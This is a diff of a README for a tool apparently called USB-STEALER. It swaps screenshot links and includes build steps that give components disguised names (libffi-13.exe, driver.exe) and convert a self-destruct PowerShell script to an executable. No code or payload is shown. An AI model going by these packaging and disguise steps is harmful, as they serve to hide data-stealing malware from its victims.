@@ -14,10 +14,11 @@ start :
  ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/1b6ea90f-6c9c-4538-8a81-9abefc69d769)
 
 launcher :
-![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/befc0edc-10b4-4dfe-9450-ecfaa170d84c)
+![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/f12adc42-e63b-4642-bb4b-70ec2cf9ac77)
+
 
 Package 📦:
-![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/f12adc42-e63b-4642-bb4b-70ec2cf9ac77)
+![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/befc0edc-10b4-4dfe-9450-ecfaa170d84c)
 
 Autodestroy💥:
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/dceb3675-dc5b-44be-9af9-f80a5e21b33c)
@@ -60,9 +61,12 @@ install >> libffi-13.exe
 autodestroy >> libffi-14.exe
 
 then use ps1 to exe to convert the autodestroy.ps1 file and rename it to driver.exe. your project should look like this:
+
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/e73ba36d-5be8-46eb-804c-4ee2f7a04b99)
+
 in folder data :
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/1fc978b3-e884-48ac-a36d-485e467785c9)
+
 in folder shorcut :
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/a0984953-cb11-4463-a2f9-048302c97827)
 
